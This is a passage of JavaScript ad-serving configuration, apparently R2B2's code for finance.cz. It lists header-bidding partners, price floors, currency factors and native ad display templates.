      "167": "42749857",
      "169": "42936660",
      "171": "42758494",
      "173": "42989624",
      "175": "43026410",
      "177": "43121537",
      "179": "43748272",
      "181": "43748273",
      "183": "43748274",
      "185": "43748275",
      "187": "43816960",
      "191": "44023945",
      "193": "35330297",
      "195": "35330298",
      "197": "44031450",
      "199": "44056173",
      "201": "44838490",
      "203": "44973412",
      "205": "38235276",
      "207": "43687619",
      "209": "38235288",
      "211": "35191520",
      "213": "35192610",
      "215": "43718505",
      "217": "45488261",
      "219": "561561",
      "221": "45720614",
      "223": "45721149",
      "225": "45721155",
      "227": "45721156",
      "229": "45721158",
      "231": "45721159",
      "233": "45721541",
      "245": "35330227",
      "247": "35329454",
      "249": "35329455",
      "251": "35329456",
      "253": "35329457",
      "255": "35329458",
      "257": "35329459",
      "259": "35329460",
      "261": "35329461",
      "263": "35329462",
      "265": "36709751",
      "267": "37160164",
      "269": "43688507",
      "271": "45751953",
      "273": "45751954",
      "277": "38235286",
      "279": "38235287",
      "283": "38235289",
      "285": "38235290",
      "287": "38235291",
      "289": "38235292",
      "291": "38235293",
      "293": "38235294",
      "327": "35330120",
      "331": "46210805",
      "341": "46781560"
    },
    "publisher": {
      "id": "32",
      "tag": "ii"
    }
  },
  "info": {
    "realDomain": "finance.cz",
    "language": "Czech",
    "ctaDefault": "Nav\u0161t\u00edvit str\u00e1nku",
    "region": "Europe"
  },
  "currencies": {
    "EUR": 24.53024579306285,
    "USD": 22.736057112975466,
    "CZK": 1,
    "AUD": 14.915355358341413,
    "BGN": 12.534941148451308,
    "BRL": 4.5859989452202425,
    "CAD": 16.70815859384137,
    "CHF": 25.951108112316398,
    "CNY": 3.1680759324439487,
    "DKK": 3.289581894141255,
    "GBP": 28.53229856197215,
    "HKD": 2.91088613195629,
    "HUF": 0.06415883469078457,
    "IDR": 0.0014595585509407543,
    "ILS": 6.121636925713936,
    "INR": 0.27263393278264914,
    "ISK": 0.16232978301864892,
    "JPY": 0.15612687931876224,
    "KRW": 0.017293138269500557,
    "MXN": 1.3133873573332984,
    "MYR": 4.8555238867497605,
    "NOK": 2.0704105209981036,
    "NZD": 13.933786645858879,
    "PHP": 0.40914839444032797,
    "PLN": 5.6634120925174996,
    "RON": 4.93208518697535,
    "SEK": 2.1732563421053204,
    "SGD": 16.937669376693766,
    "THB": 0.6357885367326827,
    "TRY": 0.7826716496761696,
    "ZAR": 1.1946189583639455
  },
  "excludes": [],
  "waterfall": {
    "id": 20091,
    "tiers": [{
      "method": "hb",
      "id": 42779,
      "channels": [{
        "chd": {
          "id": 166007,
          "tag": "adform",
          "flag": "Premium",
          "title": "Reklama",
          "keys": {
            "1": "990751"
          },
          "unmaskedDomain": true,
          "currency": "EUR",
          "priceType": "gross",
          "s2s": false,
          "width": 970,
          "height": 310,
          "sizes": [[970, 250], [970, 210], [800, 250], [970, 200], [960, 200], [930, 200], [930, 180], [750, 200], [600, 190], [970, 100], [970, 90], [750, 100], [745, 100], [750, 90], [728, 90]]
        },
        "floor": 24.58,
        "factor": 22.077221213756566,
        "factorFixed": 23.303733503409706,
        "styles": []
      }, {
        "chd": {
          "id": 166023,
          "tag": "adform",
          "flag": "PublisherStandard",
          "title": "Reklama",
          "keys": {
            "1": "1056854"
          },
          "unmaskedDomain": false,
          "currency": "EUR",
          "priceType": "gross",
          "s2s": false,
          "width": 970,
          "height": 310,
          "sizes": [[970, 250], [970, 210], [800, 250], [970, 200], [960, 200], [930, 200], [930, 180], [750, 200], [600, 190], [970, 100], [970, 90], [750, 100], [745, 100], [750, 90], [728, 90]]
        },
        "floor": 10,
        "factor": 22.077221213756566,
        "factorFixed": 23.303733503409706,
        "styles": []
      }, {
        "chd": {
          "id": 166101,
          "tag": "adform",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "1056855"
          },
          "unmaskedDomain": false,
          "currency": "EUR",
          "priceType": "gross_gross",
          "s2s": false,
          "width": 970,
          "height": 310,
          "sizes": [[970, 250], [970, 210], [800, 250], [970, 200], [960, 200], [930, 200], [930, 180], [750, 200], [600, 190], [970, 100], [970, 90], [750, 100], [745, 100], [750, 90], [728, 90]]
        },
        "floor": 0,
        "factor": 22.077221213756566,
        "factorFixed": 23.303733503409706,
        "styles": []
      }, {
        "chd": {
          "id": 166119,
          "tag": "criteo-hb-xhr",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "multiple_hb_970x310_(ii.finance.cz)\/Zero"
          },
          "unmaskedDomain": false,
          "currency": "EUR",
          "priceType": "gross",
          "s2s": false,
          "width": 970,
          "height": 310,
          "sizes": [[950, 300], [970, 250], [970, 210], [970, 200], [960, 200], [930, 200], [930, 180], [750, 200], [745, 200], [745, 200], [600, 200], [970, 100]]
        },
        "floor": 0,
        "factor": 24.53024579306285,
        "factorFixed": 24.53024579306285,
        "styles": []
      }, {
        "chd": {
          "id": 166049,
          "tag": "smart-hb",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "394820-1350874-83245"
          },
          "unmaskedDomain": false,
          "currency": "EUR",
          "priceType": "gross",
          "s2s": false,
          "width": 970,
          "height": 310,
          "sizes": [[970, 300], [950, 300], [970, 250], [950, 250], [750, 300], [900, 250], [800, 250], [970, 200], [950, 200], [930, 180], [750, 200], [970, 90], [960, 90], [950, 90], [750, 100], [780, 90], [768, 90], [728, 90]]
        },
        "floor": 0,
        "factor": 24.53024579306285,
        "bfc": 1.1111111111111112,
        "factorFixed": 24.53024579306285,
        "styles": []
      }, {
        "chd": {
          "id": 166131,
          "tag": "pubmatic-hb",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "798915-3709871"
          },
          "unmaskedDomain": false,
          "currency": "USD",
          "priceType": "gross",
          "s2s": false,
          "width": 970,
          "height": 310,
          "sizes": [[970, 250], [970, 210], [728, 90]]
        },
        "floor": 0,
        "factor": 18.870927403769635,
        "factorFixed": 20.00773025941841,
        "styles": []
      }, {
        "chd": {
          "id": 166141,
          "tag": "xandr",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "21713973"
          },
          "unmaskedDomain": false,
          "currency": "USD",
          "priceType": "gross",
          "s2s": false,
          "width": 970,
          "height": 310,
          "sizes": [[970, 250], [728, 90]]
        },
        "floor": 0,
        "factor": 22.736057112975466,
        "factorFixed": 22.736057112975466,
        "styles": []
      }, {
        "chd": {
          "id": 166173,
          "tag": "xandr-native",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "21713303"
          },
          "unmaskedDomain": false,
          "currency": "USD",
          "priceType": "gross",
          "s2s": false,
          "width": 1,
          "height": 1
        },
        "floor": 0,
        "factor": 22.736057112975466,
        "factorFixed": 22.736057112975466,
        "styles": {
          "normal": {
            "name": "n-j-1-wallpaper-single_single-56749",
            "count": 1,
            "options": {
              "dom": {
                "method": "container",
                "selectorForeign": "1"
              },
              "hb": {
                "currency": "USD",
                "onlyPrebid": true,
                "prebidAdUnitsPath": "pbjs.adUnits",
                "targeting": []
              },
              "wrap": "<div style='position: relative;width: 970px;height: 310px;box-shadow: 0px 0px 8px -3px;box-sizing: border-box;padding: 12px 0.5%;line-height: 96px;font-size: 0;'> <a href='' class='AdTrack-promoClick AdTrack-adChoices' style='position: absolute;top: 1px;right: 2px;z-index: 1;font-size: 10px;color: #ccc;font-weight: normal;line-height: 10px;margin-left: 5px;display: inline-block;text-decoration: none;'><\/a> <div class='AdTrack-ad-0' style='box-sizing: border-box;display: inline-table;width: 100%;height: 100%;text-align: center;vertical-align: middle;'><\/div> <\/div>",
              "ad": "<a href='' class='AdTrack-clickUrl-image' style='vertical-align: middle;display: table-cell; padding: 0 3%;line-height: normal;'> <img src='' alt='' class='AdTrack-imageUrl' style='max-width: 30%;max-height: 185px;vertical-align: middle;'> <div style='width: 65%;font-size: 20px;line-height: normal; margin: 0 15px; display: inline-block; vertical-align: middle;'> <span class='AdTrack-headline' style='display: block;font-size: 1.2em;line-height: 1.2em;padding-bottom: 0.5em;font-weight: bold;'><\/span> <span class='AdTrack-description' style='display: inline-block;text-decoration: none;color: black;font-size: 1em;line-height: 1em;'><\/span> <\/div> <\/a>",
              "css": "",
              "faviconFallback": "",
              "nativeOptions": {
                "titleLength": 30,
                "descLength": 250,
                "imgWidth": 270,
                "imgHeight": 140,
                "maxTitleLength": 45,
                "maxDescLength": 300
              }
            }
          },
          "product": {
            "name": "p-j-1-wallpaper-single_single-56749",
            "count": 1,
            "options": {
              "dom": {
                "method": "container",
                "selectorForeign": "1"
              },
              "hb": {
                "currency": "USD",
                "onlyPrebid": true,
                "prebidAdUnitsPath": "pbjs.adUnits",
                "targeting": []
              },
              "wrap": "<div style='position: relative;width: 970px;height: 310px;box-shadow: 0px 0px 8px -3px;box-sizing: border-box;padding: 12px 0.5%;line-height: 96px;font-size: 0;'> <a href='' class='AdTrack-promoClick AdTrack-adChoices' style='position: absolute;top: 1px;right: 2px;z-index: 1;font-size: 10px;color: #ccc;font-weight: normal;line-height: 10px;margin-left: 5px;display: inline-block;text-decoration: none;'><\/a> <div class='AdTrack-ad-0' style='box-sizing: border-box;display: inline-table;width: 100%;height: 100%;text-align: center;vertical-align: middle;'><\/div> <\/div>",
              "ad": "<a href='' class='AdTrack-clickUrl-image' style='vertical-align: middle;display: table-cell; padding: 0 3%;line-height: normal;'> <img src='' alt='' class='AdTrack-imageUrl' style='max-width: 30%;max-height: 185px;vertical-align: middle;'> <div style='width: 65%;font-size: 20px;line-height: normal; margin: 0 15px; display: inline-block; vertical-align: middle;'> <span class='AdTrack-headline' style='display: block;font-size: 1.2em;line-height: 1.2em;padding-bottom: 0.5em;font-weight: bold;'><\/span> <span class='AdTrack-description' style='display: inline-block;text-decoration: none;color: black;font-size: 1em;line-height: 1em;'><\/span> <\/div> <\/a>",
              "css": "",
              "faviconFallback": "",
              "nativeOptions": {
                "titleLength": 30,
                "descLength": 250,
                "imgWidth": 270,
                "imgHeight": 140,
                "maxTitleLength": 45,
                "maxDescLength": 300
              }
            }
          }
        }
      }, {
        "chd": {
          "id": 166193,
          "tag": "criteo-hb-xhr-native",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "1387199-hb_970x310_(ii.finance.cz)\/Native_6_Zero"
          },
          "unmaskedDomain": false,
          "currency": "EUR",
          "priceType": "gross",
          "s2s": false,
          "width": 970,
          "height": 310
        },
        "floor": 0,
        "factor": 24.53024579306285,
        "factorFixed": 24.53024579306285,
        "styles": {
          "normal": {
            "name": "n-j-1-wallpaper-single_single-56749",
            "count": 1,
            "options": {
              "dom": {
                "method": "container",
                "selectorForeign": "1"
              },
              "hb": {
                "currency": "USD",
                "onlyPrebid": true,
                "prebidAdUnitsPath": "pbjs.adUnits",
                "targeting": []
              },
              "wrap": "<div style='position: relative;width: 970px;height: 310px;box-shadow: 0px 0px 8px -3px;box-sizing: border-box;padding: 12px 0.5%;line-height: 96px;font-size: 0;'> <a href='' class='AdTrack-promoClick AdTrack-adChoices' style='position: absolute;top: 1px;right: 2px;z-index: 1;font-size: 10px;color: #ccc;font-weight: normal;line-height: 10px;margin-left: 5px;display: inline-block;text-decoration: none;'><\/a> <div class='AdTrack-ad-0' style='box-sizing: border-box;display: inline-table;width: 100%;height: 100%;text-align: center;vertical-align: middle;'><\/div> <\/div>",
              "ad": "<a href='' class='AdTrack-clickUrl-image' style='vertical-align: middle;display: table-cell; padding: 0 3%;line-height: normal;'> <img src='' alt='' class='AdTrack-imageUrl' style='max-width: 30%;max-height: 185px;vertical-align: middle;'> <div style='width: 65%;font-size: 20px;line-height: normal; margin: 0 15px; display: inline-block; vertical-align: middle;'> <span class='AdTrack-headline' style='display: block;font-size: 1.2em;line-height: 1.2em;padding-bottom: 0.5em;font-weight: bold;'><\/span> <span class='AdTrack-description' style='display: inline-block;text-decoration: none;color: black;font-size: 1em;line-height: 1em;'><\/span> <\/div> <\/a>",
              "css": "",
              "faviconFallback": "",
              "nativeOptions": {
                "titleLength": 30,
                "descLength": 250,
                "imgWidth": 270,
                "imgHeight": 140,
                "maxTitleLength": 45,
                "maxDescLength": 300
              }
            }
          },
          "product": {
            "name": "p-j-1-wallpaper-single_single-56749",
            "count": 1,
            "options": {
              "dom": {
                "method": "container",
                "selectorForeign": "1"
              },
              "hb": {
                "currency": "USD",
                "onlyPrebid": true,
                "prebidAdUnitsPath": "pbjs.adUnits",
                "targeting": []
              },
              "wrap": "<div style='position: relative;width: 970px;height: 310px;box-shadow: 0px 0px 8px -3px;box-sizing: border-box;padding: 12px 0.5%;line-height: 96px;font-size: 0;'> <a href='' class='AdTrack-promoClick AdTrack-adChoices' style='position: absolute;top: 1px;right: 2px;z-index: 1;font-size: 10px;color: #ccc;font-weight: normal;line-height: 10px;margin-left: 5px;display: inline-block;text-decoration: none;'><\/a> <div class='AdTrack-ad-0' style='box-sizing: border-box;display: inline-table;width: 100%;height: 100%;text-align: center;vertical-align: middle;'><\/div> <\/div>",
              "ad": "<a href='' class='AdTrack-clickUrl-image' style='vertical-align: middle;display: table-cell; padding: 0 3%;line-height: normal;'> <img src='' alt='' class='AdTrack-imageUrl' style='max-width: 30%;max-height: 185px;vertical-align: middle;'> <div style='width: 65%;font-size: 20px;line-height: normal; margin: 0 15px; display: inline-block; vertical-align: middle;'> <span class='AdTrack-headline' style='display: block;font-size: 1.2em;line-height: 1.2em;padding-bottom: 0.5em;font-weight: bold;'><\/span> <span class='AdTrack-description' style='display: inline-block;text-decoration: none;color: black;font-size: 1em;line-height: 1em;'><\/span> <\/div> <\/a>",
              "css": "",
              "faviconFallback": "",
              "nativeOptions": {
                "titleLength": 30,
                "descLength": 250,
                "imgWidth": 270,
                "imgHeight": 140,
                "maxTitleLength": 45,
                "maxDescLength": 300
              }
            }
          }
        }
      }, {
        "chd": {
          "id": 166205,
          "tag": "smart-hb-native",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "394820-1350874-102163"
          },
          "unmaskedDomain": false,
          "currency": "EUR",
          "priceType": "gross",
          "s2s": false,
          "width": 13,
          "height": 31
        },
        "floor": 0,
        "factor": 24.53024579306285,
        "bfc": 1.1111111111111112,
        "factorFixed": 24.53024579306285,
        "styles": {
          "normal": {
            "name": "n-j-1-wallpaper-single_single-56749",
            "count": 1,
            "options": {
              "dom": {
                "method": "container",
                "selectorForeign": "1"
              },
              "hb": {
                "currency": "USD",
                "onlyPrebid": true,
                "prebidAdUnitsPath": "pbjs.adUnits",
                "targeting": []
              },
              "wrap": "<div style='position: relative;width: 970px;height: 310px;box-shadow: 0px 0px 8px -3px;box-sizing: border-box;padding: 12px 0.5%;line-height: 96px;font-size: 0;'> <a href='' class='AdTrack-promoClick AdTrack-adChoices' style='position: absolute;top: 1px;right: 2px;z-index: 1;font-size: 10px;color: #ccc;font-weight: normal;line-height: 10px;margin-left: 5px;display: inline-block;text-decoration: none;'><\/a> <div class='AdTrack-ad-0' style='box-sizing: border-box;display: inline-table;width: 100%;height: 100%;text-align: center;vertical-align: middle;'><\/div> <\/div>",
              "ad": "<a href='' class='AdTrack-clickUrl-image' style='vertical-align: middle;display: table-cell; padding: 0 3%;line-height: normal;'> <img src='' alt='' class='AdTrack-imageUrl' style='max-width: 30%;max-height: 185px;vertical-align: middle;'> <div style='width: 65%;font-size: 20px;line-height: normal; margin: 0 15px; display: inline-block; vertical-align: middle;'> <span class='AdTrack-headline' style='display: block;font-size: 1.2em;line-height: 1.2em;padding-bottom: 0.5em;font-weight: bold;'><\/span> <span class='AdTrack-description' style='display: inline-block;text-decoration: none;color: black;font-size: 1em;line-height: 1em;'><\/span> <\/div> <\/a>",
              "css": "",
              "faviconFallback": "",
              "nativeOptions": {
                "titleLength": 30,
                "descLength": 250,
                "imgWidth": 270,
                "imgHeight": 140,
                "maxTitleLength": 45,
                "maxDescLength": 300
              }
            }
          },
          "product": {
            "name": "p-j-1-wallpaper-single_single-56749",
            "count": 1,
            "options": {
              "dom": {
                "method": "container",
                "selectorForeign": "1"
              },
              "hb": {
                "currency": "USD",
                "onlyPrebid": true,
                "prebidAdUnitsPath": "pbjs.adUnits",
                "targeting": []
              },
              "wrap": "<div style='position: relative;width: 970px;height: 310px;box-shadow: 0px 0px 8px -3px;box-sizing: border-box;padding: 12px 0.5%;line-height: 96px;font-size: 0;'> <a href='' class='AdTrack-promoClick AdTrack-adChoices' style='position: absolute;top: 1px;right: 2px;z-index: 1;font-size: 10px;color: #ccc;font-weight: normal;line-height: 10px;margin-left: 5px;display: inline-block;text-decoration: none;'><\/a> <div class='AdTrack-ad-0' style='box-sizing: border-box;display: inline-table;width: 100%;height: 100%;text-align: center;vertical-align: middle;'><\/div> <\/div>",
              "ad": "<a href='' class='AdTrack-clickUrl-image' style='vertical-align: middle;display: table-cell; padding: 0 3%;line-height: normal;'> <img src='' alt='' class='AdTrack-imageUrl' style='max-width: 30%;max-height: 185px;vertical-align: middle;'> <div style='width: 65%;font-size: 20px;line-height: normal; margin: 0 15px; display: inline-block; vertical-align: middle;'> <span class='AdTrack-headline' style='display: block;font-size: 1.2em;line-height: 1.2em;padding-bottom: 0.5em;font-weight: bold;'><\/span> <span class='AdTrack-description' style='display: inline-block;text-decoration: none;color: black;font-size: 1em;line-height: 1em;'><\/span> <\/div> <\/a>",
              "css": "",
              "faviconFallback": "",
              "nativeOptions": {
                "titleLength": 30,
                "descLength": 250,
                "imgWidth": 270,
                "imgHeight": 140,
                "maxTitleLength": 45,
                "maxDescLength": 300
              }
            }
          }
        }
      }, {
        "chd": {
          "id": 548023,
          "tag": "seznam-ssp-hb2",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "4": "296564"
          },
          "unmaskedDomain": false,
          "currency": "CZK",
          "priceType": "gross",
          "s2s": false,
          "width": 970,
          "height": 310,
          "sizes": [[970, 210], [728, 90], [480, 300]]
        },
        "floor": 0,
        "factor": 1,
        "factorFixed": 1,
        "styles": {
          "normal": {
            "name": "n-j-4-wallpaper-quad_quad-56751",
            "count": 4,
            "options": {
              "dom": {
                "method": "container",
                "selectorForeign": "1"
              },
              "hb": {
                "currency": "USD",
                "onlyPrebid": true,
                "prebidAdUnitsPath": "pbjs.adUnits",
                "targeting": []
              },
              "wrap": "<div style='position: relative;width: 970px;height: 310px;box-shadow: 0px 0px 8px -3px;box-sizing: border-box;padding: 12px 0.5%;line-height: 96px;font-size: 0;'> <a href='' class='AdTrack-promoClick AdTrack-adChoices' style='position: absolute;top: 1px;right: 2px;z-index: 1;font-size: 10px;color: #ccc;font-weight: normal;line-height: 10px;margin-left: 5px;display: inline-block;text-decoration: none;'><\/a> <div class='AdTrack-ad-0' style='box-sizing: border-box;display: inline-table;width: 23%;margin: 0 1%;height: 100%;text-align: center;vertical-align: middle;'><\/div> <div class='AdTrack-ad-1' style='box-sizing: border-box;display: inline-table;width: 23%;margin: 0 1%;height: 100%;text-align: center;vertical-align: middle;'><\/div> <div class='AdTrack-ad-2' style='box-sizing: border-box;display: inline-table;width: 23%;margin: 0 1%;height: 100%;text-align: center;vertical-align: middle;'><\/div> <div class='AdTrack-ad-3' style='box-sizing: border-box;display: inline-table;width: 23%;margin: 0 1%;height: 100%;text-align: center;vertical-align: middle;'><\/div> <\/div>",
              "ad": "<a href='' class='AdTrack-clickUrl-image' style='vertical-align: middle;display: table-cell; padding: 0 3%;line-height: normal;'> <img src='' alt='' class='AdTrack-imageUrl' style='max-width: 100%;max-height: 72.5px;'> <div style='width: 100%;font-size: 15px;line-height: normal;'> <span class='AdTrack-headline' style='display: block;font-size: 1.2em;line-height: 1.2em;padding: 0.5em 0;font-weight: bold;'><\/span> <span class='AdTrack-description' style='display: inline-block;text-decoration: none;color: black;font-size: 1em;line-height: 1em;'><\/span> <\/div> <\/a>",
              "css": "",
              "faviconFallback": "",
              "nativeOptions": {
                "titleLength": 20,
                "descLength": 80,
                "maxTitleLength": 25,
                "maxDescLength": 90
              }
            }
          },
          "product": {
            "name": "p-j-4-wallpaper-quad_quad-56751",
            "count": 4,
            "options": {
              "dom": {
                "method": "container",
                "selectorForeign": "1"
              },
              "hb": {
                "currency": "USD",
                "onlyPrebid": true,
                "prebidAdUnitsPath": "pbjs.adUnits",
                "targeting": []
              },
              "wrap": "<div style='position: relative;width: 970px;height: 310px;box-shadow: 0px 0px 8px -3px;box-sizing: border-box;padding: 12px 0.5%;line-height: 96px;font-size: 0;'> <a href='' class='AdTrack-promoClick AdTrack-adChoices' style='position: absolute;top: 1px;right: 2px;z-index: 1;font-size: 10px;color: #ccc;font-weight: normal;line-height: 10px;margin-left: 5px;display: inline-block;text-decoration: none;'><\/a> <div class='AdTrack-ad-0' style='box-sizing: border-box;display: inline-table;width: 23%;margin: 0 1%;height: 100%;text-align: center;vertical-align: middle;'><\/div> <div class='AdTrack-ad-1' style='box-sizing: border-box;display: inline-table;width: 23%;margin: 0 1%;height: 100%;text-align: center;vertical-align: middle;'><\/div> <div class='AdTrack-ad-2' style='box-sizing: border-box;display: inline-table;width: 23%;margin: 0 1%;height: 100%;text-align: center;vertical-align: middle;'><\/div> <div class='AdTrack-ad-3' style='box-sizing: border-box;display: inline-table;width: 23%;margin: 0 1%;height: 100%;text-align: center;vertical-align: middle;'><\/div> <\/div>",
              "ad": "<a href='' class='AdTrack-clickUrl-image' style='vertical-align: middle;display: table-cell; padding: 0 3%;line-height: normal;'> <img src='' alt='' class='AdTrack-imageUrl' style='max-width: 100%;max-height: 72.5px;'> <div style='width: 100%;font-size: 15px;line-height: normal;'> <span class='AdTrack-headline' style='display: block;font-size: 1.2em;line-height: 1.2em;padding: 0.5em 0;font-weight: bold;'><\/span> <span class='AdTrack-description' style='display: inline-block;text-decoration: none;color: black;font-size: 1em;line-height: 1em;'><\/span> <\/div> <\/a>",
              "css": "",
              "faviconFallback": "",
              "nativeOptions": {
                "titleLength": 20,
                "descLength": 80,
                "maxTitleLength": 25,
                "maxDescLength": 90
              }
            }
          }
        }
      }, {
        "chd": {
          "id": 780465,
          "tag": "rtbhouse-hb",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "hb_970x310_(ii.finance.cz)_-_Zero"
          },
          "unmaskedDomain": false,
          "currency": "USD",
          "priceType": "gross",
          "s2s": false,
          "width": 970,
          "height": 310,
          "sizes": [[336, 280], [970, 250], [728, 90], [480, 300], [970, 210], [900, 250], [950, 300], [930, 180], [750, 100], [336, 300], [776, 200], [750, 200], [970, 90], [700, 300], [750, 300], [372, 310], [360, 300], [600, 200], [600, 300]]
        },
        "floor": 0,
        "factor": 22.736057112975466,
        "factorFixed": 22.736057112975466,
        "styles": []
      }, {
        "chd": {
          "id": 787421,
          "tag": "adaptmx-hb",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "hb_970x310_(ii.finance.cz)_-_Zero"
          },
          "unmaskedDomain": false,
          "currency": "USD",
          "priceType": "gross",
          "s2s": false,
          "width": 970,
          "height": 310,
          "sizes": [[336, 280], [970, 250], [728, 90], [480, 300], [970, 210], [900, 250], [950, 300], [930, 180], [750, 100], [336, 300], [776, 200], [750, 200], [970, 90], [700, 300], [750, 300], [372, 310], [360, 300], [600, 200], [600, 300]]
        },
        "floor": 0,
        "factor": 22.736057112975466,
        "factorFixed": 22.736057112975466,
        "styles": []
      }, {
        "chd": {
          "id": 788577,
          "tag": "onetag",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "hb_970x310_ii_finance_cz_-_Zero"
          },
          "unmaskedDomain": false,
          "currency": "EUR",
          "priceType": "gross",
          "s2s": false,
          "width": 970,
          "height": 310,
          "sizes": [[336, 280], [970, 250], [728, 90], [480, 300], [970, 210], [900, 250], [950, 300], [930, 180], [750, 100], [336, 300], [776, 200], [750, 200], [970, 90], [700, 300], [750, 300], [372, 310], [360, 300], [600, 200], [600, 300]]
        },
        "floor": 0,
        "factor": 24.53024579306285,
        "factorFixed": 24.53024579306285,
        "styles": []
      }],
      "s2s": false
    }]
  },
  "cls": {
    "headline": "AdTrack-headline",
    "description": "AdTrack-description",
    "adChoices": "AdTrack-adChoices",
    "date": "AdTrack-date",
    "ad": "AdTrack-ad-*",
    "ads": "AdTrack-ads",
    "container": "AdTrack-container",
    "promoTitle": "AdTrack-promoTitle",
    "promoIcon": "AdTrack-promoIcon",
    "promoClick": "AdTrack-promoClick",
    "closeTitle": "AdTrack-closeTitle",
    "closeClick": "AdTrack-closeClick",
    "creative1": "AdTrack-creative1",
    "creative2": "AdTrack-creative2",
    "creative3": "AdTrack-creative3",
    "creative23": "AdTrack-creative23",
    "creative123": "AdTrack-creative123",
    "bannerUrl": "AdTrack-bannerUrl",
    "bannerRel": "AdTrack-bannerRel",
    "adUrl": "AdTrack-adUrl",
    "clickUrl": "AdTrack-clickUrl-*",
    "visibleUrl": "AdTrack-visibleUrl",
    "longHeadline": "AdTrack-longHeadline",
    "companyName": "AdTrack-companyName",
    "logoUrl": "AdTrack-logoUrl",
    "squareLogoUrl": "AdTrack-squareLogoUrl",
    "screenshot": "AdTrack-screenshot",
    "screenshothq": "AdTrack-screenshothq",
    "favicon": "AdTrack-favicon",
    "cta": "AdTrack-cta",
    "imageUrl": "AdTrack-imageUrl",
    "category": "AdTrack-category",
    "logoutUrl": "AdTrack-logoutUrl",
    "title": "AdTrack-title",
    "manufacturer": "AdTrack-manufacturer",
    "price": "AdTrack-price",
    "lastPrice": "AdTrack-lastPrice",
    "discount": "AdTrack-discount",
    "condition": "AdTrack-condition",
    "additionalInfo": "AdTrack-additionalInfo",
    "productDescription": "AdTrack-productDescription",
    "shopName": "AdTrack-shopName",
    "shopSlogan": "AdTrack-shopSlogan",
    "shopUrl": "AdTrack-shopUrl",
    "shopLogoUrl": "AdTrack-shopLogoUrl",
    "cleanShopUrl": "AdTrack-cleanShopUrl",
    "confirmImpUrl": "AdTrack-confirmImpUrl",
    "productTextTemplate": "AdTrack-productTextTemplate"
  },
  "test": false
}, null, "delivery.r2b2.cz", null, {
  "timeout": 10000,
  "visitor": {
    "countryISO": "JP",
    "gdpr": 0
  },
  "publisher": {
    "id": "32",
    "tag": "ii"
  },
  "ip": "50.7.159.142"
});
function trackAndSendData() {
  const dataToTrack = gatherTrackedData();
  if (Object.keys(dataToTrack).length) {
    sendTrackedData(dataToTrack);
  }
}
AdTrack.units["classic_ii.finance.cz_hb_300x600_1"] = new AdTrack.Dispatcher("classic", "ii.finance.cz", "hb", "300x600_1", {
  "renderer": "flexi",
  "options": {
    "dom": {
      "method": "container",
      "selectorForeign": "1"
    },
    "hb": {
      "currency": "USD",
      "onlyPrebid": true,
      "prebidAdUnitsPath": "pbjs.adUnits",
      "targeting": []
    },
    "noFPBNs": {
      "1": "36864793",
      "3": "35378918",
      "5": "38308494",
      "7": "37087795",
      "9": "37388055",
      "13": "37471860",
      "15": "37543676",
      "19": "37827190",
      "21": "37841587",
      "23": "37848515",
      "25": "37974109",
      "27": "37974663",
      "31": "38062118",
      "33": "38105499",
      "35": "38155389",
      "41": "38205101",
      "43": "38206998",
      "45": "38207000",
      "47": "38294481",
      "49": "38397175",
      "51": "38499466",
      "53": "38499409",
      "55": "38564125",
      "57": "38564378",
      "59": "38564379",
      "63": "38564531",
      "65": "38564652",
      "67": "38578260",
      "73": "38607930",
      "75": "38814525",
      "83": "38943634",
      "85": "39048920",
      "87": "39152378",
      "89": "39464480",
      "93": "39671195",
      "95": "39671197",
      "97": "39863294",
      "99": "40165496",
      "101": "40177548",
      "103": "40304968",
      "107": "40548792",
      "109": "40769002",
      "111": "40769003",
      "113": "40769102",
      "115": "40954941",
      "117": "40954952",
      "119": "40964226",
      "121": "40964227",
      "123": "41110847",
      "125": "508238",
      "129": "41289790",
      "131": "41289791",
      "135": "41293384",
      "145": "41110891",
      "147": "41390292",
      "149": "41526930",
      "153": "41579327",
      "155": "41640870",
      "157": "41649243",
      "159": "41649244",
      "161": "41903685",
      "163": "42688264",
      "165": "42749800",
      "167": "42749857",
      "169": "42936660",
      "171": "42758494",
      "173": "42989624",
      "175": "43026410",
      "177": "43121537",
      "179": "43748272",
      "181": "43748273",
      "183": "43748274",
      "185": "43748275",
      "187": "43816960",
      "191": "44023945",
      "193": "35330297",
      "195": "35330298",
      "197": "44031450",
      "199": "44056173",
      "201": "44838490",
      "203": "44973412",
      "205": "38235276",
      "207": "43687619",
      "209": "38235288",
      "211": "35191520",
      "213": "35192610",
      "215": "43718505",
      "217": "45488261",
      "219": "561561",
      "221": "45720614",
      "223": "45721149",
      "225": "45721155",
      "227": "45721156",
      "229": "45721158",
      "231": "45721159",
      "233": "45721541",
      "245": "35330227",
      "247": "35329454",
      "249": "35329455",
      "251": "35329456",
      "253": "35329457",
      "255": "35329458",
      "257": "35329459",
      "259": "35329460",
      "261": "35329461",
      "263": "35329462",
      "265": "36709751",
      "267": "37160164",
      "269": "43688507",
      "271": "45751953",
      "273": "45751954",
      "277": "38235286",
      "279": "38235287",
      "283": "38235289",
      "285": "38235290",
      "287": "38235291",
      "289": "38235292",
      "291": "38235293",
      "293": "38235294",
      "327": "35330120",
      "331": "46210805",
      "341": "46781560"
    },
    "publisher": {
      "id": "32",
      "tag": "ii"
    }
  },
  "info": {
    "realDomain": "finance.cz",
    "language": "Czech",
    "ctaDefault": "Nav\u0161t\u00edvit str\u00e1nku",
    "region": "Europe"
  },
  "currencies": {
    "EUR": 24.53024579306285,
    "USD": 22.736057112975466,
    "CZK": 1,
    "AUD": 14.915355358341413,
    "BGN": 12.534941148451308,
    "BRL": 4.5859989452202425,
    "CAD": 16.70815859384137,
    "CHF": 25.951108112316398,
    "CNY": 3.1680759324439487,
    "DKK": 3.289581894141255,
    "GBP": 28.53229856197215,
    "HKD": 2.91088613195629,
    "HUF": 0.06415883469078457,
    "IDR": 0.0014595585509407543,
    "ILS": 6.121636925713936,
